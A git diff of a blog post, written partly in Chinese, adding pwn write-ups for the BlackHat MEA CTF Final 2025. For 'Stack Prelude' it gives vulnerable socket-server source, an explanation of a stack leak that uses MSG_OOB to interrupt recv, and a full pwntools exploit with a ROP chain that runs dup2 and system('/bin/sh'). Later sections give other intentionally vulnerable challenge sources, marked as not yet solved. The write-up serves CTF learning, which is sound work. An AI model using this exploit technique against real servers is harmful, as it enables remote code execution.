@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: BlackHat MEA CTF Final 2025"
 published: 2025-12-02
-updated: 2025-12-03
+updated: 2025-12-06
 description: "Write-ups for BlackHat MEA CTF Final 2025 pwn aspect."
 image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.2yysscpa8n.avif"
 tags: ["Pwn", "Write-ups"]
@@ -235,3 +235,390 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+# Stack Prelude
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> It is either easy or impossible.
+
+## Write-up
+
+比赛期间没做出来，赛后复现的，纯纯的经验题好吧……
+
+题目源码如下：
+
+```c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main(int argc, char **argv) {
+  struct sockaddr_in cli, addr = {0};
+  socklen_t clen;
+  int cfd, sfd = -1, yes = 1;
+  ssize_t n;
+  char buf[0x100];
+  unsigned short port = argc < 2 ? 31337 : atoi(argv[1]);
+
+  if ((sfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+    perror("socket");
+    goto err;
+  }
+
+  if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) < 0) {
+    perror("setsockopt(SO_REUSEADDR)");
+    goto err;
+  }
+
+  addr.sin_family = AF_INET;
+  addr.sin_addr.s_addr = htonl(INADDR_ANY);
+  addr.sin_port = htons(port);
+
+  if (bind(sfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+    perror("bind");
+    goto err;
+  }
+
+  if (listen(sfd, 1) < 0) {
+    perror("listen");
+    goto err;
+  }
+
+  clen = sizeof(cli);
+  if ((cfd = accept(sfd, (struct sockaddr*)&cli, &clen)) < 0) {
+    perror("accept");
+    goto err;
+  }
+
+  while (1) {
+    n = 0;
+    recv(cfd, &n, sizeof(ssize_t), MSG_WAITALL);
+    if (n <= 0 || n >= 0x200)
+      break;
+
+    recv(cfd, buf, n, MSG_WAITALL);
+    send(cfd, buf, n, 0);
+  }
+
+  return 0;
+
+err:
+  if (sfd >= 0) close(sfd);
+  return 1;
+}
+```
+
+这题是个一次只能处理一个请求的 socket 服务器，先说说我当时取得的成果吧……我是发现可以发送半闭 FIN 包使 `recv` 函数不接收完整的数据直接返回，由于没有检查 `recv` 函数的返回值，后面的 `send` 会泄漏栈数据。
+
+这里提到的半闭 FIN 包可以通过 `target.shutdown("write")` 发送关闭输入的半闭包，保留输出，但是这么做的问题就在于，关闭了输入后在 `send` 结束回到 while 循环头后 `recv` 接收不到数据，返回 0，退出循环，结束程序。所以即使我们泄漏了数据，要是不能继续和程序交互的话也只能是干瞪眼……
+
+~~草啊，其实当时是很有希望做出这道题的，但是没有想过我可以给自己发送的数据加 flags，如果能想到这点的话这题就秒了……感觉自己是猪头，我连 FIN 都想到了，就是没想到 flags，这难道不是一个很自然的想法吗？？气死我了 smh（~~
+
+现场学能绕过 `MSG_WAITALL` 的方法，总结为如下几种情况：
+
+1. 对端关闭连接 (FIN)
+2. 对端异常断开 (RST)
+3. 中断信号
+4. 超时（前提是设置了 `SO_RCVTIMEO` flag）
+5. 其它奇奇怪怪的致命错误
+
+FIN 可以排除了，因为发了这个后续不能继续操作，超时也可以排除，因为没设置这个 flag，我们可以重点研究一下有哪些可以由 client 端发送的 flag 会触发中断信号，这里就不赘述了，直接说结论 —— `MSG_OOB`，这个 flag 表示 `out-of-band`，如果用在 `send`，就代表会使用一个额外的 `urgent byte`，表示外带数据，接收端处理 TCP 数据包发现 urgent byte 会触发 `SIGURG` 信号，这个信号属于异步事件，可以打断带有 `MSG_WAITALL` flag 的 `recv` 函数。
+
+现在我们泄漏了数据，又能维持交互，那剩下的应该没啥好说的了，只需要注意 socket server 需要让 stdin 和 stdout 指向 socket 通道就好了，不然无法和返回的 shell 交互。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+
+from pwn import (
+    ELF,
+    constants,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-L", action="store_true")
+parser.add_argument("-T", "--threads", type=int, default=None, help="thread count")
+args = parser.parse_args()
+
+
+FILE = "./chall_patched"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = elf.libc
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch(argv=None, envp=None):
+    global target, thread
+
+    if argv is None:
+        argv = [FILE]
+
+    if args.L and args.threads is not None:
+        raise ValueError("Options -L and -T cannot be used together.")
+
+    if args.L:
+        target = process(argv, env=envp)
+    elif args.threads:
+        if args.threads <= 0:
+            raise ValueError("Thread count must be positive.")
+        process(argv, env=envp)
+
+        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
+    else:
+        target = remote(HOST, PORT, ssl=True)
+
+
+def main():
+    launch([FILE, "1337"])
+
+    thread[0].sendline(flat(0x120))
+    thread[0].sock.send(b"A" * 2, constants.MSG_OOB)
+
+    resp = thread[0].recv(0x120)
+    canary = int.from_bytes(resp[0x108:0x110], "little")
+    libc.address = int.from_bytes(resp[0x118:0x120], "little") - 0x2A1CA
+
+    thread[0].success(f"canary: {hex(canary)}")
+    thread[0].success(f"libc: {hex(libc.address)}")
+
+    raw_input("DEBUG")
+    thread[0].sendline(flat(0x188))
+
+    pop_rdi_ret = libc.address + 0x000000000010F78B
+    pop_rsi_ret = libc.address + 0x0000000000110A7D
+    binsh = next(libc.search(b"/bin/sh"))
+    dup2 = libc.sym["dup2"]
+    system = libc.sym["system"]
+    align = pop_rdi_ret + 1
+    payload = flat(
+        {
+            0x108 - 1: canary,
+            0x118 - 1: pop_rdi_ret,
+            0x120 - 1: 4,
+            0x128 - 1: pop_rsi_ret,
+            0x130 - 1: 0,
+            0x138 - 1: dup2,
+            0x140 - 1: pop_rdi_ret,
+            0x148 - 1: 4,
+            0x150 - 1: pop_rsi_ret,
+            0x158 - 1: 1,
+            0x160 - 1: dup2,
+            0x168 - 1: align,
+            0x170 - 1: pop_rdi_ret,
+            0x178 - 1: binsh,
+            0x180 - 1: system,
+        },
+        filler=b"\x00",
+    )
+    raw_input("DEBUG")
+    thread[0].sendline(payload)
+
+    thread[0].sendline(flat(0x200))
+
+    thread[0].interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# Stack Impromptu
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> The word impossible is not in my dictionary.
+
+## Write-up
+
+```cpp
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <pthread.h>
+
+void fatal(const char *msg) {
+  perror(msg);
+  pthread_exit(NULL);
+}
+
+int server_read(int& fd) {
+  size_t size;
+  char buf[0x40];
+
+  memset(buf, 0, sizeof(buf));
+  if (read(fd, &size, sizeof(size)) != sizeof(size)
+      || size > 0x100
+      || read(fd, buf, size) < size)
+    goto err;
+
+  write(fd, buf, size);
+  return 0;
+
+err:
+  close(fd);
+  fatal("Could not receive data (read)");
+  return 1;
+}
+
+void* server_main(void* arg) {
+  int fd = (int)((intptr_t)arg);
+  while (server_read(fd) == 0);
+  return NULL;
+}
+
+int main(int argc, char** argv) {
+  pthread_t th;
+  struct sockaddr_in cli, addr = { 0 };
+  socklen_t clen;
+  int cfd, sfd = -1, yes = 1;
+  unsigned short port = argc < 2 ? 31337 : atoi(argv[1]);
+
+  if ((sfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+    perror("socket");
+    goto err;
+  }
+
+  if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) < 0) {
+    perror("setsockopt(SO_REUSEADDR)");
+    goto err;
+  }
+
+  addr.sin_family = AF_INET;
+  addr.sin_addr.s_addr = htonl(INADDR_ANY);
+  addr.sin_port = htons(port);
+
+  if (bind(sfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+    perror("bind");
+    goto err;
+  }
+
+  if (listen(sfd, 5) < 0) {
+    perror("listen");
+    goto err;
+  }
+
+  while (1) {
+    clen = sizeof(cli);
+    if ((cfd = accept(sfd, (struct sockaddr*)&cli, &clen)) < 0) {
+      perror("accept");
+      goto err;
+    }
+
+    pthread_create(&th, NULL, server_main, (void*)((intptr_t)cfd));
+    pthread_detach(th);
+  }
+
+  return 0;
+
+err:
+  if (sfd >= 0) close(sfd);
+  return 1;
+}
+```
+
+待复现。
+
+## Exploit
+
+# Stack Rhapsody
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Unknown
+
+## Write-up
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+  char buf[0x10000];
+  fgets(buf, 0x100000, stdin);
+  system("echo Are you a good pwner?");
+  return 0;
+}
+```
+
+待复现。
+
+## Exploit
+
+# Scream
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Keep the secret.
+
+## Write-up
+
+待复现。
+
+## Exploit
+
+# EDU
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> QEMU provides an educational device for learning VM escape.
+> This bug is intentionally made for educational purpose, right? …… Right?
+>
+> <https://www.qemu.org/docs/master/specs/edu.html>
+
+## Write-up
+
+待复现。
+
+## Exploit
